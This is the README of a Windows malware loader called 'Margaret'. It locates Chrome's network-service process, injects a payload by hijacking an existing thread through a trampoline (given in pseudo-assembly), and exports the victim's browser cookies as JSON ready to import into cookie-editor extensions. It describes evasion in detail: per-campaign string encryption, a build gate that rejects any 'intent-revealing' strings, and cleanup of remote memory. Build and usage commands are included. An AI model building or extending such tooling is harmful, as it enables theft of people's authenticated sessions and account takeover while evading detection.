# Margaret loader

Standalone delivery component for the Margaret blob: finds the Chrome
*network utility* process, injects the blob, waits for completion, and
exports the extracted cookies as JSON. The blob is delivery-agnostic —
replace this loader with your own tooling if you prefer.

## How it works

1. **Find the target.** Walks the process list and reads each
   `chrome.exe` command line via the PEB (`NtQueryInformationProcess`),
   looking for `utility-sub-type=network.mojom.NetworkService`. All
   look-up strings are per-campaign encrypted at compile time and wiped
   after use — `strings` finds nothing.
2. **Prepare memory** (W^X): blob written RW then flipped RX; a separate
   allocation holds the argument block, the 2 MB output buffer, and a
   fresh 64 KB stack for the hijacked thread.
3. **Hijack a thread** — no thread is ever created:

```
SuspendThread ──▶ save full context ──▶ build a small trampoline
                                              │
   ResumeThread ◀── SetThreadContext ◀────────┘
        RIP = trampoline      RSP = fresh stack      RCX = args

   trampoline:
     mov rcx, args        ; loaded HERE: resuming a thread from a
                          ; syscall clobbers RCX (sysret semantics)
     sub rsp, 0x20        ; x64 home space for the blob
     call blob            ; blob entry sees a properly aligned stack
     restore RAX..R11     ; volatile registers from the saved context
     mov rsp, orig_rsp    ; the victim's exact stack pointer
     jmp orig_rip         ; the thread resumes its original life
```

4. **Wait for completion** by polling a status sentinel in the argument
   block (the blob writes it last) — never by watching RIP, which would
   false-positive while the blob calls Chrome code.
5. **Export**: cookies are written in Cookie-Editor and StorageAce JSON
   formats, with mandatory attributes reconstructed from cookie-name
   prefixes (`__Secure-` ⇒ Secure; `__Host-` ⇒ Secure + host-only).
   On success every remote allocation is freed.

## Build

```bash
make loader          # quiet, string-free (production)
make loader-verbose  # diagnostics on stdout (development)
make loader-gate     # fails if any intent-revealing string appears
```

## Usage

```text
loader.exe <pid> <blob.bin>     explicit target
loader.exe <blob.bin>           auto-find the network utility
loader.exe --test [pid]         27-byte stub: verifies the hijack
                                mechanics without the blob
```

With `-DLOADER_VERBOSE`, progress markers report the hijack stages and
the blob's internal stages on failure (thread death diagnostics include
the last seen RIP and a post-mortem trampoline dump).
